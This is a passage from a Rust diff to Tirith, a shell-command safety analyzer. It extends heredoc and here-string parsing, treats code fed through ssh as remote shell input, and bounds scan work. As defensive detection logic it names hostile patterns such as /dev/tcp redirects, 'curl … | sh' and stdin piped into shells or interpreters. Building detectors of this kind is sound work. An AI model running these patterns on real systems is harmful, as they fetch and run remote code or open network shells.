+                && !target.starts_with("/dev/tcp/")
+                && !target.starts_with("/dev/udp/")
+        };
+        return match args.as_slice() {
+            [flag, redirect, target] => {
+                matches!(flag.as_str(), "-l" | "-c" | "-w" | "-m")
+                    && redirect == "<"
+                    && target_ok(target)
+            }
+            [flag, redirect] => {
+                matches!(flag.as_str(), "-l" | "-c" | "-w" | "-m")
+                    && redirect.strip_prefix('<').is_some_and(target_ok)
+            }
+            _ => false,
+        };
+    }
+    if !fixed("printf") {
         return false;
     }
     let digits = |value: &str| !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit());
@@ -3970,6 +4382,7 @@ fn capture_executable_body(
                 bodies.push(ExecutableBody::without_origin(format!(": {body}"), shell));
             } else {
                 bodies.push(ExecutableBody {
+                    best_effort: false,
                     input: body.to_string(),
                     shell,
                     origin: Some(ExecutableBodyOrigin {
@@ -3985,6 +4398,7 @@ fn capture_executable_body(
     if let Some(suffix) = raw.get(open + 1..) {
         if !suffix.trim().is_empty() {
             bodies.push(ExecutableBody {
+                best_effort: false,
                 input: suffix.to_string(),
                 shell,
                 origin: Some(ExecutableBodyOrigin {
@@ -4365,6 +4779,13 @@ pub(crate) struct ExecutableBody {
     /// occurrence and execution role selected by the parser branch that found
     /// them.
     pub origin: Option<ExecutableBodyOrigin>,
+    /// The body was recovered only to add findings, never to prove coverage:
+    /// the child command of a fish external wrapper (`nice`, `timeout`, ...),
+    /// which the released fish analysis did not read. A gap, work budget, or
+    /// depth limit inside it (or inside anything nested in it) must not make
+    /// the enclosing input incomplete; a finding its own analysis proves still
+    /// applies. Consumers that recurse carry the flag to every descendant body.
+    pub best_effort: bool,
 }
 
 impl ExecutableBody {
@@ -4373,8 +4794,19 @@ impl ExecutableBody {
             input,
             shell,
             origin: None,
+            best_effort: false,
         }
     }
+}
+
+/// Whether a finding only reports that analysis could not finish (as opposed
+/// to proving a risk). A best-effort body may add proven findings, never these.
+pub(crate) fn is_incompleteness_finding(finding: &crate::verdict::Finding) -> bool {
+    matches!(
+        finding.rule_id,
+        crate::verdict::RuleId::AnalysisIncomplete
+            | crate::verdict::RuleId::PackageLookupIncomplete
+    )
 }
 
 #[derive(Debug, Default)]
@@ -4418,14 +4850,44 @@ pub(crate) struct ExecutableBodyOccurrence {
 
 const MAX_HEREDOCS: usize = 32;
 const MAX_HEREDOC_DELIMITER_BYTES: usize = 256;
-const MAX_HEREDOC_BODY_BYTES: usize = 256 * 1024;
-// Keep the root ceiling above every supported single-body decoder/rewrite
-// ceiling (currently 256 KiB), while preventing the 10 MiB file/LSP ceiling
-// from reaching the allocation-heavy shell parsers in one pass.
-pub(crate) const MAX_EXECUTABLE_SCAN_INPUT_BYTES: usize = 512 * 1024;
-pub(crate) const MAX_EXECUTABLE_SCAN_CANDIDATES: usize = 256;
-const MAX_EXECUTABLE_SCAN_BODIES: usize = 64;
-const MAX_EXECUTABLE_SCAN_BODY_BYTES: usize = 512 * 1024;
+/// A heredoc body up to the whole root ceiling: an agent writing a file of a
+/// few thousand lines (`cat > notes.md <<'EOF' ... EOF`, about 550 KiB at
+/// 5000 lines) is analyzed instead of blocked.
+const MAX_HEREDOC_BODY_BYTES: usize = MAX_EXECUTABLE_SCAN_INPUT_BYTES;
+// Keep the root ceiling at or above every supported single-body decoder or
+// rewrite ceiling, while preventing the 10 MiB file/LSP ceiling from reaching
+// the allocation-heavy shell parsers in one pass. 1 MiB is also the most a
+// checked command can carry as an argument (macOS ARG_MAX; Linux allows 128
+// KiB per argument).
+pub(crate) const MAX_EXECUTABLE_SCAN_INPUT_BYTES: usize = 1024 * 1024;
+/// Shell words (and substitution or group openers) one scan level hands to the
+/// body parsers. Large enough for a batch script of a few thousand lines;
+/// every recursive level still charges the shared scan-work budget
+/// ([`MAX_SCAN_WORK_BYTES`]).
+pub(crate) const MAX_EXECUTABLE_SCAN_CANDIDATES: usize = 16 * 1024;
+/// Recovered bodies one scan level retains, and their total size. Every
+/// retained body is analyzed again by the full rule set at the next level, so
+/// these (not the root size) bound the multiplied work of `f() { ... }; f; f;
+/// f; ...`. A file written through a heredoc (`cat > f <<'EOF'`) is data, not
+/// a body; a heredoc fed to a shell is.
+const MAX_EXECUTABLE_SCAN_BODIES: usize = 256;
+const MAX_EXECUTABLE_SCAN_BODY_BYTES: usize = 256 * 1024;
+
+/// The finding text for a scan that stopped at one of the per-level size
+/// limits above, naming them.
+pub(crate) fn executable_scan_size_limit_description() -> String {
+    format!(
+        "The command is larger than Tirith analyzes in one check: at most {} KiB of shell \
+         text, {} shell words, and {} nested bodies (substitutions, groups, wrapper, \
+         function and shell-fed heredoc bodies) totalling {} KiB per level. Everything before \
+         the limit was analyzed; the part after it was not examined and is blocked instead of \
+         being treated as clean. Split a longer script into several checked commands.",
+        MAX_EXECUTABLE_SCAN_INPUT_BYTES / 1024,
+        MAX_EXECUTABLE_SCAN_CANDIDATES,
+        MAX_EXECUTABLE_SCAN_BODIES,
+        MAX_EXECUTABLE_SCAN_BODY_BYTES / 1024,
+    )
+}
 
 #[derive(Debug)]
 struct PosixHeredocSpec {
@@ -4785,12 +5247,11 @@ fn posix_heredoc_specs(
             continue;
         }
         if bytes.get(index..index + 3) == Some(b"<<<") {
-            // Here-strings have a different expansion grammar and no delimiter
-            // line. Keep them explicitly unsupported rather than confusing the
-            // operand with a heredoc delimiter.
-            unsupported = true;
+            // A here-string has no delimiter line: skip the operator and
+            // read its word as an ordinary word. The executable-body scan
+            // reads the word and its reader (`posix_here_string_at`).
             index += 3;
-            word_start = false;
+            word_start = true;
             continue;
         }
         if matches!(byte, b'(' | b')') {
@@ -4929,6 +5390,7 @@ fn scan_unquoted_heredoc_expansions(body: &str, scan: &mut PosixHeredocRecovery)
                 Some(next) => {
                     scan.bodies
                         .extend(recovered.into_iter().map(|input| ExecutableBody {
+                            best_effort: false,
                             input,
                             shell: ShellType::Posix,
                             origin: None,
@@ -4952,6 +5414,7 @@ fn scan_unquoted_heredoc_expansions(body: &str, scan: &mut PosixHeredocRecovery)
                 .filter(|input| !input.trim().is_empty())
             {
                 scan.bodies.push(ExecutableBody {
+                    best_effort: false,
                     input: input.to_string(),
                     shell: ShellType::Posix,
                     origin: None,
@@ -4961,6 +5424,155 @@ fn scan_unquoted_heredoc_expansions(body: &str, scan: &mut PosixHeredocRecovery)
             continue;
         }
         index += 1;
+    }
+}
+
+/// A POSIX here-string (`[n]<<< WORD`): the shells expand WORD once and feed
+/// its value, plus a newline, to the command on descriptor `n` (stdin by
+/// default). Its reader is found exactly as a heredoc's is, with the
+/// operator and the word masked.
+struct PosixHereString {
+    /// The byte after `<<<`; the scan reads WORD from here as an ordinary
+    /// word, so its substitutions are recovered like any argument's.
+    operator_end: usize,
+    /// How the redirected command reads the value: code for a shell that
+    /// takes its script from stdin, ambiguous for a non-shell interpreter
+    /// (which may run stdin as code), data for anything else.
+    reading: HeredocReading,
+    /// WORD's value when it is a literal.
+    value: Option<String>,
+}
+
+/// The here-string whose `<<<` starts at `operator` in `raw`, or `None` when
+/// its word cannot be told (no word, `<<<<`, an unterminated quote or
+/// expansion, or syntax the shells read differently).
+fn posix_here_string_at(raw: &str, operator: usize) -> Option<PosixHereString> {
+    let bytes = raw.as_bytes();
+    if bytes.get(operator..operator + 3) != Some(b"<<<".as_slice()) {
+        return None;
+    }
+    let operator_end = operator + 3;
+    let mut word_start = operator_end;
+    while matches!(bytes.get(word_start), Some(b' ' | b'\t')) {
+        word_start += 1;
+    }
+    let word_end = posix_here_string_word_end(raw, word_start)?;
+    // Digits are the descriptor only when they are the whole word (`3<<< x`);
+    // `sh2<<< x` feeds `sh2` on stdin.
+    let digit_start = raw[..operator]
+        .rfind(|character: char| !character.is_ascii_digit())
+        .map_or(0, |offset| offset + 1);
+    let descriptor_word = digit_start < operator
+        && (digit_start == 0
+            || matches!(
+                bytes[digit_start - 1],
+                b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')'
+            ));
+    let (masked_start, fd) = if descriptor_word {
+        (digit_start, raw[digit_start..operator].to_string())
+    } else {
+        (operator, "0".to_string())
+    };
+    // The whole redirection is one token, newlines inside a quoted word too.
+    let mut masked = bytes.to_vec();
+    for byte in &mut masked[masked_start..word_end] {
+        *byte = b' ';
+    }
+    let masked = String::from_utf8(masked).ok()?;
+    let segments = tokenize::tokenize(&masked, ShellType::Posix);
+    let mut work = MAX_HEREDOC_READER_WORK_BYTES;
+    let mut cx = HeredocReadContext {
+        fd: &fd,
+        work: &mut work,
+        here_string: true,
+    };
+    let reading = heredoc_reader_at(
+        &masked,
+        &segments,
+        None,
+        masked_start,
+        word_end,
+        MAX_HEREDOC_READER_DEPTH,
+        &mut cx,
+    )
+    .unwrap_or(HeredocReading::AMBIGUOUS);
+    Some(PosixHereString {
+        operator_end,
+        reading,
+        value: static_wrapper_word(&raw[word_start..word_end], ShellType::Posix),
+    })
+}
+
+/// The end of the here-string word starting at `start`. Quotes, escapes and
+/// `$(...)`, `${...}`, `$'...'` and backtick expansions are read whole; a
+/// bare `(` or a process substitution, which the shells do not agree on, and
+/// an unterminated quote or expansion return `None`.
+fn posix_here_string_word_end(raw: &str, start: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    let mut index = start;
+    while let Some(&byte) = bytes.get(index) {
+        match byte {
+            b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b')' => break,
+            b'<' | b'>' if bytes.get(index + 1) == Some(&b'(') => return None,
+            b'<' | b'>' => break,
+            b'(' => return None,
+            b'\\' => {
+                bytes.get(index + 1)?;
+                index += 2;
+            }
+            b'\'' => index = index + 1 + raw[index + 1..].find('\'')? + 1,
+            b'"' => index = posix_double_quoted_word_end(raw, index)?,
+            b'`' => index = find_backtick_close(raw, index)? + 1,
+            b'$' => index = posix_dollar_expansion_end(raw, index)?,
+            _ => index += 1,
+        }
+    }
+    (index > start).then_some(index)
+}
+
+/// The byte after the `"..."` string opening at `open`, reading nested
+/// command substitutions, parameter expansions and backticks whole.
+fn posix_double_quoted_word_end(raw: &str, open: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    let mut index = open + 1;
+    loop {
+        match *bytes.get(index)? {
+            b'"' => return Some(index + 1),
+            b'\\' => {
+                bytes.get(index + 1)?;
+                index += 2;
+            }
+            b'`' => index = find_backtick_close(raw, index)? + 1,
+            b'$' if matches!(bytes.get(index + 1), Some(b'(' | b'{')) => {
+                index = posix_dollar_expansion_end(raw, index)?;
+            }
+            _ => index += 1,
+        }
+    }
+}
+
+/// The byte after the unquoted `$` expansion at `dollar`: `$(...)`, `${...}`
+/// or `$'...'` read whole, any other `$` as one byte. `None` for an
+/// unterminated expansion or a `$'...'` the shells end in different places.
+fn posix_dollar_expansion_end(raw: &str, dollar: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    match bytes.get(dollar + 1) {
+        Some(b'(') => Some(find_substitution_close(raw, dollar + 1, ShellType::Posix)? + 1),
+        Some(b'{') => Some(find_shell_delimiter_close(raw, dollar + 1, ShellType::Posix)? + 1),
+        Some(b'\'') => {
+            if posix_ansi_c_string_reads_differently(bytes, dollar + 1) {
+                return None;
+            }
+            let mut index = dollar + 2;
+            loop {
+                match *bytes.get(index)? {
+                    b'\\' => index += 2,
+                    b'\'' => return Some(index + 1),
+                    _ => index += 1,
+                }
+            }
+        }
+        _ => Some(dollar + 1),
     }
 }
 
@@ -4974,6 +5586,11 @@ struct HeredocReading {
     /// other than its script input, where a later read may run it, or the
     /// reader could not be found within the bounds.
     ambiguous: bool,
+    /// Every shell that runs the body runs it somewhere tirith's analysis
+    /// did not used to reach (a remote shell behind `ssh`), so the body is
+    /// analyzed best-effort: it adds the findings it proves, never an
+    /// incomplete-analysis block (see [`ExecutableBody::best_effort`]).
+    best_effort: bool,
 }
 
 impl HeredocReading {
@@ -4981,24 +5598,48 @@ impl HeredocReading {
     const DATA: Self = Self {
         shell: None,
         ambiguous: false,
+        best_effort: false,
     };
     const AMBIGUOUS: Self = Self {
         shell: None,
         ambiguous: true,
+        best_effort: false,
     };
 
     fn shell(shell: ShellType) -> Self {
         Self {
             shell: Some(shell),
             ambiguous: false,
+            best_effort: false,
         }
     }
 
-    /// The reading of a body that both `self` and `other` may read.
-    fn or(self, other: Self) -> Self {
+    /// A shell on another host (`ssh host sh <<'EOF'`) runs the body.
+    fn remote_shell(shell: ShellType) -> Self {
         Self {
-            shell: self.shell.or(other.shell),
+            shell: Some(shell),
+            ambiguous: false,
+            best_effort: true,
+        }
+    }
+
+    /// The reading of a body that both `self` and `other` may read. A local
+    /// shell reading wins over a best-effort one.
+    fn or(self, other: Self) -> Self {
+        let local = |reading: &Self| reading.shell.is_some() && !reading.best_effort;
+        let best_effort =
+            (self.shell.is_some() || other.shell.is_some()) && !local(&self) && !local(&other);
+        let shell = if local(&self) {
+            self.shell
+        } else if local(&other) {
+            other.shell
+        } else {
+            self.shell.or(other.shell)
+        };
+        Self {
+            shell,
             ambiguous: self.ambiguous || other.ambiguous,
+            best_effort,
         }
     }
 }
@@ -5015,6 +5656,10 @@ struct HeredocReadContext<'a> {
     fd: &'a str,
     /// Bytes of shell text that may still be tokenized.
     work: &'a mut usize,
+    /// The redirection is a here-string (`<<<`). A non-shell interpreter
+    /// that may run its stdin as code makes its reading ambiguous; a heredoc
+    /// keeps the older shell-only reading.
+    here_string: bool,
 }
 
 impl HeredocReadContext<'_> {
@@ -5116,7 +5761,8 @@ fn heredoc_reader_at(
             .unwrap_or(HeredocReading::AMBIGUOUS),
             None => {
                 let copied = descriptor_copied_to_stdin(after_operator, cx.fd);
-                let reading = heredoc_command_reader(segment, cx.fd, cx.fd == "0" || copied);
+                let reading =
+                    heredoc_command_reader(segment, cx.fd, cx.fd == "0" || copied, cx.here_string);
                 // zsh also reads reserved words after a leading redirection
                 // (`<<'EOF' { sh; }`, `<<'EOF' if true; then sh; fi`): the
                 // heredoc is the standard input of that compound command,
@@ -5285,7 +5931,7 @@ fn heredoc_list_reader(
                 None => {
                     let on_stdin =
                         cx.fd == "0" || copied || descriptor_copied_to_stdin(&segment.raw, cx.fd);
-                    heredoc_command_reader(segment, cx.fd, on_stdin)
+                    heredoc_command_reader(segment, cx.fd, on_stdin, cx.here_string)
                 }
             },
             PosixLeadEnd::Closer(..) | PosixLeadEnd::Nothing => HeredocReading::DATA,
@@ -5297,7 +5943,12 @@ fn heredoc_list_reader(
 
 /// Who reads the heredoc of the simple command `segment` (reserved words
 /// already read): `on_stdin` when the heredoc is its standard input.
-fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool) -> HeredocReading {
+fn heredoc_command_reader(
+    segment: &tokenize::Segment,
+    fd: &str,
+    on_stdin: bool,
+    here_string: bool,
+) -> HeredocReading {
     let bare_exec = segment.command.as_deref().is_some_and(|command| {
         crate::rules::command::normalize_cmd_base(command, ShellType::Posix) == "exec"
     }) && crate::escalation::args_without_redirections(&segment.args)
@@ -5307,13 +5958,27 @@ fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool)
         return HeredocReading::AMBIGUOUS;
     }
     let Some((command, args)) = resolve_wrapped_command_for_shell(segment, ShellType::Posix) else {
-        return HeredocReading::DATA;
+        return if on_stdin {
+            assignment_substitution_heredoc_reading(segment)
+        } else {
+            HeredocReading::DATA
+        };
     };
     let command = crate::rules::command::normalize_cmd_base(&command, ShellType::Posix);
+    if command == "ssh" {
+        return if on_stdin {
+            ssh_remote_heredoc_reading(&args)
+        } else {
+            HeredocReading::DATA
+        };
+    }
     let child_shell = match command.as_str() {
         "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" | "."
         | "source" => ShellType::Posix,
         "fish" => ShellType::Fish,
+        _ if here_string && on_stdin && !here_string_data_reader(&command, &args) => {
+            return HeredocReading::AMBIGUOUS;
+        }
         _ => return HeredocReading::DATA,
     };
     let argv = crate::escalation::args_without_redirections(&args);
@@ -5343,6 +6008,195 @@ fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool)
         HeredocReading::shell(child_shell)
     } else {
         HeredocReading::AMBIGUOUS
+    }
+}
+
+/// Commands a here-string on stdin is plain data for: text and checksum
+/// filters and builtins that never run what they read (and ones that never
+/// read stdin at all). Any other non-shell reader keeps the here-string
+/// unresolved, as every here-string was before: interpreters and REPL-like
+/// tools run stdin (`python3`, `awk '{system($0)}'`, `sed e`, `dc`, `ed`,
+/// `sqlite3`), `xargs` turns it into argv, and a process substitution
+/// argument (`tee >(sh)`) hands it to a command the scan cannot see.
+fn here_string_data_reader(command: &str, args: &[String]) -> bool {
+    matches!(
+        command,
+        "cat"
+            | "tac"
+            | "head"
+            | "tail"
+            | "grep"
+            | "egrep"
+            | "fgrep"
+            | "rg"
+            | "jq"
+            | "base64"
+            | "base32"
+            | "basenc"
+            | "xxd"
+            | "od"
+            | "hexdump"
+            | "wc"
+            | "sort"
+            | "uniq"
+            | "cut"
+            | "tr"
+            | "rev"
+            | "nl"
+            | "fold"
+            | "fmt"
+            | "column"
+            | "paste"
+            | "comm"
+            | "join"
+            | "expand"
+            | "unexpand"
+            | "tee"
+            | "read"
+            | "mapfile"
+            | "readarray"
+            | "md5sum"
+            | "sha1sum"
+            | "sha224sum"
+            | "sha256sum"
+            | "sha384sum"
+            | "sha512sum"
+            | "b2sum"
+            | "shasum"
+            | "md5"
+            | "cksum"
+            | "iconv"
+            | "strings"
+            | "gzip"
+            | "gunzip"
+            | "zcat"
+            | "bzip2"
+            | "bunzip2"
+            | "xz"
+            | "unxz"
+            | "zstd"
+            | "cmp"
+            | "diff"
+            | "bc"
+            | "pbcopy"
+            | "wl-copy"
+            | "xclip"
+            | "xsel"
+            | "echo"
+            | "printf"
+            | "true"
+            | "false"
+            | ":"
+            | "test"
+            | "["
+    ) && !has_process_substitution_arg(args)
+}
+
+/// The reader of a heredoc on an assignment-only command
+/// (`x=$(sh) <<'EOF'`). dash and zsh perform the redirection before they
+/// expand the assignment, so its command substitutions read the heredoc on
+/// standard input (bash and ksh do not, but `/bin/sh` is dash on Debian and
+/// Ubuntu). The body is code when one of those substitutions runs standard
+/// input as code; a command word, or no substitution, keeps it data.
+fn assignment_substitution_heredoc_reading(segment: &tokenize::Segment) -> HeredocReading {
+    let words = tokenize::split_words(&segment.raw);
+    let argv = crate::escalation::args_without_redirections(&words);
+    if argv.is_empty() || !argv.iter().all(|word| tokenize::is_env_assignment(word)) {
+        return HeredocReading::DATA;
+    }
+    let substitutions = executable_substitution_scan(&argv.join(" "), ShellType::Posix);
+    let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+    if substitutions
+        .bodies
+        .iter()
+        .any(|body| posix_body_accepts_pipeline_as_code(&body.input, 0, &mut remaining_bodies))
+    {
+        HeredocReading::shell(ShellType::Posix)
+    } else {
+        HeredocReading::DATA
+    }
+}
+
+/// OpenSSH options that take a value (`-p 22`, `-p22`).
+const SSH_VALUE_OPTIONS: &str = "BbcDEeFIiJLlmOoPpQRSWw";
+/// OpenSSH flags. `-N` (no command), `-n` and `-f` (standard input from
+/// `/dev/null`), `-s` (a subsystem, not a shell command), `-G` and `-V`
+/// (print and exit), and the `-O`, `-Q` and `-W` modes never hand standard
+/// input to a remote shell.
+const SSH_FLAG_OPTIONS: &str = "46AaCfGgKkMNnqsTtVvXxYy";
+
+/// The reader of a heredoc on `ssh`'s standard input. ssh forwards it to the
+/// remote command, so the body is code when that command runs standard input
+/// as a script (`ssh host sh <<'EOF'`, `ssh host bash -s <<'EOF'`,
+/// `ssh host sudo sh <<'EOF'`), or when there is no remote command and the
+/// remote login shell reads it (`ssh host <<'EOF'`). The remote shell is not
+/// the local one, so the body is analyzed best-effort: it adds what it
+/// proves (`curl … | sh`), never an incomplete-analysis block. A remote
+/// command that keeps the body as data (`ssh host 'cat > notes.txt'`), a
+/// mode that never reads it (`-n`, `-N`, `-f`, `-s`, `-O`, `-W`, ...), and a
+/// word tirith cannot read keep the released reading: data.
+fn ssh_remote_heredoc_reading(args: &[String]) -> HeredocReading {
+    let argv = crate::escalation::args_without_redirections(args);
+    let mut host = false;
+    let mut command_start = None;
+    let mut index = 0usize;
+    let mut options_ended = false;
+    while index < argv.len() {
+        let Some(word) = static_wrapper_word(&argv[index], ShellType::Posix) else {
+            return HeredocReading::DATA;
+        };
+        if !options_ended && word == "--" {
+            options_ended = true;
+            index += 1;
+            continue;
+        }
+        if !options_ended && word.len() > 1 && word.starts_with('-') {
+            let letters = &word[1..];
+            let mut consumed_next = false;
+            for (offset, letter) in letters.char_indices() {
+                if matches!(letter, 'N' | 'n' | 'f' | 's' | 'G' | 'V' | 'O' | 'Q' | 'W') {
+                    return HeredocReading::DATA;
+                }
+                if SSH_VALUE_OPTIONS.contains(letter) {
+                    consumed_next = offset + letter.len_utf8() == letters.len();
+                    break;
+                }
+                if !SSH_FLAG_OPTIONS.contains(letter) {
+                    return HeredocReading::DATA;
+                }
+            }
+            index += if consumed_next { 2 } else { 1 };
+            continue;
+        }
+        if host {
+            command_start = Some(index);
+            break;
+        }
+        host = true;
+        // OpenSSH parses options after the destination too, until the first
+        // operand of the remote command; `--` there still ends them.
+        index += 1;
+    }
+    if !host {
+        return HeredocReading::DATA;
+    }
+    let Some(start) = command_start else {
+        return HeredocReading::remote_shell(ShellType::Posix);
+    };
+    let mut words = Vec::with_capacity(argv.len() - start);
+    for raw in &argv[start..] {
+        let Some(word) = static_wrapper_word(raw, ShellType::Posix) else {
+            return HeredocReading::DATA;
+        };
+        words.push(word);
+    }
+    // The remote shell parses the words joined by spaces.
+    let remote = words.join(" ");
+    let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+    if posix_body_accepts_pipeline_as_code(&remote, 0, &mut remaining_bodies) {
+        HeredocReading::remote_shell(ShellType::Posix)
+    } else {
+        HeredocReading::DATA
     }
 }
 
@@ -5879,6 +6733,7 @@ fn heredoc_readers_for_header(
     let mut cx = HeredocReadContext {
         fd: &target.fd,
         work,
+        here_string: false,
     };
     let segments = tokenize::tokenize(&masked, ShellType::Posix);
     // The line and the body open at the operator are read once per heredoc
@@ -6351,6 +7206,7 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
                     let mut cx = HeredocReadContext {
                         fd: &heredoc.fd,
                         work: &mut work,
+                        here_string: false,
                     };
                     heredoc_reader_at(
                         program,
@@ -6396,8 +7252,9 @@ impl PosixHeredocRecovery {
                 unescape_unquoted_heredoc(&body)
             };
             if !input.trim().is_empty() {
-                self.bodies
-                    .push(ExecutableBody::without_origin(input, shell));
+                let mut executable = ExecutableBody::without_origin(input, shell);
+                executable.best_effort = reading.best_effort;
+                self.bodies.push(executable);
             }
         }
     }
@@ -6451,6 +7308,10 @@ fn bounded_executable_candidates(raw: &str, shell: ShellType) -> (&str, bool) {
         let byte = bytes[index];
         match quote {
             ShellLexQuote::Single => {
+                if fish_single_quote_escape_byte_at(shell, bytes, index) {
+                    index += 2;
+                    continue;
+                }
                 if byte == b'\'' {
                     if shell == ShellType::PowerShell && bytes.get(index + 1) == Some(&b'\'') {
                         index += 2;
@@ -6582,27 +7443,35 @@ fn bounded_executable_candidates(raw: &str, shell: ShellType) -> (&str, bool) {
 }
 
 fn bound_executable_bodies(scan: &mut ExecutableSubstitutionScan) -> bool {
-    let mut keep = Vec::with_capacity(scan.bodies.len());
+    let mut keep = vec![false; scan.bodies.len()];
     let mut retained_bodies = 0usize;
     let mut retained_bytes = 0usize;
     let mut exhausted = false;
 
-    for body in &scan.bodies {
-        // Preserve occurrences. Equal source strings at different byte ranges
-        // are distinct execution events and can have different pipe,
-        // redirection, and control-flow parents. Callers that only need unique
-        // strings may deduplicate after analysis; enforcement callers must not.
-        let next_bytes = retained_bytes.saturating_add(body.input.len());
-        if retained_bodies >= MAX_EXECUTABLE_SCAN_BODIES
-            || next_bytes > MAX_EXECUTABLE_SCAN_BODY_BYTES
-        {
-            exhausted = true;
-            keep.push(false);
-            continue;
+    // Best-effort bodies get only the budget the required bodies leave, and
+    // one that does not fit is dropped without a gap: it never proves
+    // coverage, so it must neither crowd out a required body nor report one.
+    for best_effort in [false, true] {
+        for (index, body) in scan.bodies.iter().enumerate() {
+            if body.best_effort != best_effort {
+                continue;
+            }
+            // Preserve occurrences. Equal source strings at different byte
+            // ranges are distinct execution events and can have different
+            // pipe, redirection, and control-flow parents. Callers that only
+            // need unique strings may deduplicate after analysis; enforcement
+            // callers must not.
+            let next_bytes = retained_bytes.saturating_add(body.input.len());
+            if retained_bodies >= MAX_EXECUTABLE_SCAN_BODIES
+                || next_bytes > MAX_EXECUTABLE_SCAN_BODY_BYTES
+            {
+                exhausted |= !best_effort;
+                continue;
+            }
+            retained_bodies += 1;
+            retained_bytes = next_bytes;
+            keep[index] = true;
         }
-        retained_bodies += 1;
-        retained_bytes = next_bytes;
-        keep.push(true);
     }
 
     let mut keep = keep.into_iter();
@@ -7635,6 +8504,122 @@ fn rewrite_inherited_directory_command_words(
     Some(rewritten)
 }
 
+/// Shell text (bytes) one analysis may hand to the recursive executable-body
+/// scanners in total, across every recursion level and every caller (the
+/// tier-1 nested-body walk, URL extraction, the command rules and their
+/// substitution evaluation). Each scanner already bounds its own depth and
+/// body count, but they call one another, so the product of those bounds
+/// could still turn one crafted input into minutes of work (CORE-6: 128
+/// nested `$(echo` took 20-40 s). The golden fixtures use at most a few KiB
+/// and a 96 KiB script about 1 MiB (see `engine::scan_work_budget_tests`);
+/// running out is reported as incomplete analysis, never as a clean result.
+/// A larger input (a file scan) gets [`SCAN_WORK_PER_INPUT_BYTE`] times its
+/// size instead, so linear work over a big file is never cut short.
+pub(crate) const MAX_SCAN_WORK_BYTES: usize = 8 * 1024 * 1024;
+
+/// Scan work allowed per input byte when that exceeds
+/// [`MAX_SCAN_WORK_BYTES`]: a bound on super-linear work, not on size.
+pub(crate) const SCAN_WORK_PER_INPUT_BYTE: usize = 64;
+
+thread_local! {
+    /// Remaining scan work of the analysis running on this thread, or `None`
+    /// outside one (direct rule calls are unbounded, as before).
+    static SCAN_WORK_REMAINING: std::cell::Cell<Option<usize>> = const { std::cell::Cell::new(None) };
+    /// The budget the outermost scope armed.
+    static SCAN_WORK_LIMIT: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
+    static SCAN_WORK_EXHAUSTED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
+}
+
+/// One analysis's shared scan-work budget. The outermost scope arms it and
+/// clears it on drop; a nested scope (an analysis started inside another on
+/// the same thread) shares the outer budget.
+pub(crate) struct ScanWorkScope {
+    outermost: bool,
+}
+
+impl ScanWorkScope {
+    /// The budget for analyzing an input of `input_bytes` bytes.
+    pub(crate) fn enter_for(input_bytes: usize) -> Self {
+        Self::enter_with(
+            MAX_SCAN_WORK_BYTES.max(input_bytes.saturating_mul(SCAN_WORK_PER_INPUT_BYTE)),
+        )
+    }
+
+    pub(crate) fn enter_with(limit: usize) -> Self {
+        let outermost = SCAN_WORK_REMAINING.with(|remaining| {
+            if remaining.get().is_some() {
+                false
+            } else {
+                remaining.set(Some(limit));
+                SCAN_WORK_LIMIT.with(|armed| armed.set(limit));
+                SCAN_WORK_EXHAUSTED.with(|exhausted| exhausted.set(false));
+                true
+            }
+        });
+        Self { outermost }
+    }
+}
+
+impl Drop for ScanWorkScope {
+    fn drop(&mut self) {
+        if self.outermost {
+            SCAN_WORK_REMAINING.with(|remaining| remaining.set(None));
+            SCAN_WORK_EXHAUSTED.with(|exhausted| exhausted.set(false));
+        }
+    }
+}
+
+/// Charge `bytes` of scanning to the running analysis. `false` once its
+/// budget is spent (and from then on): the caller returns its fail-closed
+/// answer.
+pub(crate) fn charge_scan_work(bytes: usize) -> bool {
+    SCAN_WORK_REMAINING.with(|remaining| match remaining.get() {
+        None => true,
+        Some(left) if left >= bytes && !scan_work_exhausted() => {
+            remaining.set(Some(left - bytes));
+            true
+        }
+        Some(_) => {
+            remaining.set(Some(0));
+            SCAN_WORK_EXHAUSTED.with(|exhausted| exhausted.set(true));
+            false
+        }
+    })
+}
+
+/// Run best-effort scan work (a dormant function body's analysis): it may
+/// spend at most half of the analysis's remaining scan budget, and running
+/// out inside it neither marks the analysis incomplete nor starves the work
+/// after it. The caller keeps only what the run proved.
+pub(crate) fn with_best_effort_scan_work<T>(work: impl FnOnce() -> T) -> T {
+    let Some(left) = SCAN_WORK_REMAINING.with(std::cell::Cell::get) else {
+        return work();
+    };
+    let exhausted = scan_work_exhausted();
+    let share = left / 2;
+    SCAN_WORK_REMAINING.with(|remaining| remaining.set(Some(share)));
+    let result = work();
+    let unused = SCAN_WORK_REMAINING
+        .with(std::cell::Cell::get)
+        .unwrap_or(0)
+        .min(share);
+    SCAN_WORK_REMAINING.with(|remaining| remaining.set(Some(left - share + unused)));
+    SCAN_WORK_EXHAUSTED.with(|flag| flag.set(exhausted));
+    result
+}
+
+/// Whether the running analysis ran out of scan work.
+pub(crate) fn scan_work_exhausted() -> bool {
+    SCAN_WORK_EXHAUSTED.with(std::cell::Cell::get)
+}
+
+/// Scan work the running analysis has used, for tests.
+#[cfg(test)]
+pub(crate) fn scan_work_used() -> Option<usize> {
+    let limit = SCAN_WORK_LIMIT.with(std::cell::Cell::get);
+    SCAN_WORK_REMAINING.with(|remaining| remaining.get().map(|left| limit - left))
+}
+
 /// Structured executable-body scan.  Most callers only need the recovered
 /// bodies and use [`executable_substitutions`]; enforcement callers also retain
 /// `gap` so ambiguous PowerShell invocation never collapses to "no body".
@@ -7642,6 +8627,12 @@ pub(crate) fn executable_substitution_scan(
     raw: &str,
     shell: ShellType,
 ) -> ExecutableSubstitutionScan {
+    if !charge_scan_work(raw.len()) {
